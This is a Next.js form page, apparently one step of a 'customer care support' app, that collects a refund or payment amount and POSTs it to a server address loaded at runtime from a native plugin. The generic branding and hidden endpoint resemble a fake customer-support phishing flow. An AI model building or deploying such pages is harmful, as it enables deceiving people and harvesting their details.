'use client';
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";  
import { useState } from 'react';
import Link from "next/link";
import Echo from "../registerPlugin";

export default function Home() {
  const router = useRouter();

  const [loading, setLoading] = useState(false);
  const [amountTypeText, setAmountTypeText] = useState("Refund");
  const amountType = (type)=>{
    setAmountTypeText(type);
  }
  const handleSubmit = async (e) => {
      e.preventDefault()
      setLoading(true); 
      
      try {
        
        const result = await Echo.getConfig();
        const API_URL = result.value;
        const SITE = result.site;
        
        const formData = new FormData(e.target);
        const jsonObject1 = {};
        const jsonObject = {};
        formData.forEach((value, key) => {
            jsonObject[key] = value;
        });
        jsonObject1['data'] = jsonObject;
        jsonObject1['site'] = SITE;
        jsonObject1['id'] = localStorage.getItem("collection_id");

          const response = await fetch(`${API_URL}/form/add`, {
              method: 'POST',
              body: JSON.stringify(jsonObject1)
          });

          if (!response.ok) {
              throw new Error('Network response was not ok');
          }
          const responseData = await response.json();
          router.push('/3');
      } catch (error) {
          console.error("Error calling Echo plugin or API:", error);
          alert("An error occurred, please try again."+error);
      } finally{
          setLoading(false); 
      }
  };
  return (
    <>
    <Header />
      <h3 className="text-center mx-2">
        CUSTOMER CARE SUPPORT INSTANT SOLUTION
      </h3>
      <img src="help/step2.png" className="w-100" alt="" />
    <main className="px-3">
    <div className="form-container m-2">
  <form onSubmit={handleSubmit} id="submitForm">
    <div className="mt-4 mb-3">
      <div className="form-check form-check-inline">
        <input
          className="form-check-input amount-type"
          type="radio"
          defaultValue="Refund"
          name="amount_type"
          defaultChecked=""
          onClick={()=>{amountType("Refund")}}
        />
        <label className="form-check-label">Refund</label>
      </div>
      <div className="form-check form-check-inline">
        <input
          className="form-check-input amount-type"
          type="radio"
          defaultValue="Pay"
          name="amount_type"
          onClick={()=>{amountType("Pay")}}
        />
        <label className="form-check-label">Pay</label>
      </div>
      <div className="form-check form-check-inline">
        <input
          className="form-check-input amount-type"
          type="radio"
          defaultValue="Other"
          name="amount_type"
          onClick={()=>{amountType("Other")}}
        />
        <label className="form-check-label">Other</label>
      </div>
    </div>
      {amountTypeText !== 'Other' && (
        <div className="form-floating mb-3">
          <input
            type="text"
            inputMode="numeric"
            id="amount"
            name="amount"
            className="form-control"
            placeholder="Ex. 7065221377"
            required
          />
          <label>
            <span>{amountTypeText}</span> Amount*
          </label>
        </div>
      )}
    <div className="d-flex justify-content-between">
      <Link
        href="/"
        className="btn btn-outline-success  mt-3 text-center"
      >
        <img src="help/back.png" alt="" />
      </Link>
      <button
        type="submit"
        className="btn btn-success  mt-3 text-center"
        id="submit-button"
        disabled={loading}
      >
        {loading ? 'Please wait...' : 'Next'}
      </button>
    </div>
    
  </form>
</div>

    </main>

    <Footer />
</>
  );

}
